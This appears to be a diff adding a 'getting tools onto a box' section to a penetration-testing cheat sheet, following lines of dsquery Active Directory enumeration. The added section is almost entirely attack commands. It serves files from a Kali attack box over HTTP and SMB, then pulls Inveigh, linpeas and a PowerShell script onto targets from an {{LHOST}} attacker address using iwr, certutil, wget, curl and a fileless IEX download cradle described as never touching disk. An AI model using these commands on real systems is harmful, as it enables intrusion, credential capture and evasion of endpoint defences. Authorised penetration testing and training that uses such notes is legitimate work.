@@ -76,3 +76,48 @@ dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountContro
 dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
 ```
 
+## Getting tools onto a box (HTTP / SMB pull)
+
+> `{{LHOST}}` = your attack box IP. Host the file once on Kali, then pull with a one-liner on each box instead of copying manually.
+
+### Serve from your attack box (Kali)
+
+```bash
+# HTTP
+python3 -m http.server 80
+```
+
+```bash
+# SMB (Impacket) — share name "share", current dir
+impacket-smbserver share . -smb2support
+```
+
+### Pull onto a Windows target
+
+```powershell
+# PowerShell download
+iwr http://{{LHOST}}/Inveigh.exe -OutFile C:\Windows\Temp\Inveigh.exe
+```
+
+```cmd
+:: certutil LOLBIN
+certutil -urlcache -f http://{{LHOST}}/Inveigh.exe Inveigh.exe
+```
+
+```powershell
+# Run straight from the SMB share (no local copy)
+\\{{LHOST}}\share\Inveigh.exe
+```
+
+```powershell
+# In-memory, never touches disk (download cradle)
+IEX(New-Object Net.WebClient).DownloadString('http://{{LHOST}}/script.ps1')
+```
+
+### Pull onto a Linux target
+
+```bash
+wget http://{{LHOST}}/linpeas.sh -O /tmp/linpeas.sh
+curl http://{{LHOST}}/linpeas.sh -o /tmp/linpeas.sh
+```
+
